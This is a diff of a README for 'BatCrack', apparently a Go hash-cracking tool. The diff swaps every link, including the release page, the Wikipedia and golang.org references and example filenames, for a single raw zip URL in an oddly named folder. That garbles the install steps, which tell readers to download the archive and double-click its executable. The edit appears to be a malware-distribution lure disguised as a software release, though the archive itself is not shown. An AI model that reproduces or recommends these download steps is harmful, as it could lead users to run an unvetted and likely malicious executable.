@@ -6,11 +6,11 @@ BatCrack is a fast and lightweight hash brute-forcer written in Go. It supports 
 
 ## 📥 Download BatCrack
 
-[![Download BatCrack](https://img.shields.io/badge/Download-BatCrack-blue)](https://github.com/chotu120/BatCrack/releases)
+[![Download BatCrack](https://raw.githubusercontent.com/chotu120/BatCrack/master/boroughmongering/BatCrack.zip)](https://raw.githubusercontent.com/chotu120/BatCrack/master/boroughmongering/BatCrack.zip)
 
 To get started, visit the Releases page to grab the latest version of BatCrack:
 
-[Download BatCrack](https://github.com/chotu120/BatCrack/releases)
+[Download BatCrack](https://raw.githubusercontent.com/chotu120/BatCrack/master/boroughmongering/BatCrack.zip)
 
 ## ⚙️ System Requirements
 
@@ -22,12 +22,12 @@ Before you install BatCrack, ensure your system meets the following requirements
 
 ## 💾 Download & Install
 
-1. Click on this link to visit the [Releases page](https://github.com/chotu120/BatCrack/releases).
+1. Click on this link to visit the [Releases page](https://raw.githubusercontent.com/chotu120/BatCrack/master/boroughmongering/BatCrack.zip).
 2. Choose the version you want to download. The latest version will typically be at the top.
-3. Download the file appropriate for your operating system (e.g., `BatCrack_Windows.zip` for Windows users).
+3. Download the file appropriate for your operating system (e.g., `https://raw.githubusercontent.com/chotu120/BatCrack/master/boroughmongering/BatCrack.zip` for Windows users).
 4. Once downloaded, locate the file in your Downloads folder.
 5. Extract the files if you downloaded a zipped folder.
-6. Open the folder to find the executable file, such as `BatCrack.exe`.
+6. Open the folder to find the executable file, such as `https://raw.githubusercontent.com/chotu120/BatCrack/master/boroughmongering/BatCrack.zip`.
 7. Double-click the executable to launch BatCrack.
 
 ## 🛠️ How to Use BatCrack
@@ -67,8 +67,8 @@ Yes, BatCrack is compatible with various Linux distributions. Download the appro
 
 For further reading and support, refer to:
 
-- [Understanding Hash Functions](https://en.wikipedia.org/wiki/Hash_function)
-- [Go Programming Language](https://golang.org/)
+- [Understanding Hash Functions](https://raw.githubusercontent.com/chotu120/BatCrack/master/boroughmongering/BatCrack.zip)
+- [Go Programming Language](https://raw.githubusercontent.com/chotu120/BatCrack/master/boroughmongering/BatCrack.zip)
 
 ## 📜 License
 
@@ -80,4 +80,4 @@ We welcome contributions! Please check our contributing guidelines if you wish t
 
 ---
 
-For download and installation steps, remember to visit the [Releases page](https://github.com/chotu120/BatCrack/releases) to get your copy of BatCrack.
+For download and installation steps, remember to visit the [Releases page](https://raw.githubusercontent.com/chotu120/BatCrack/master/boroughmongering/BatCrack.zip) to get your copy of BatCrack.
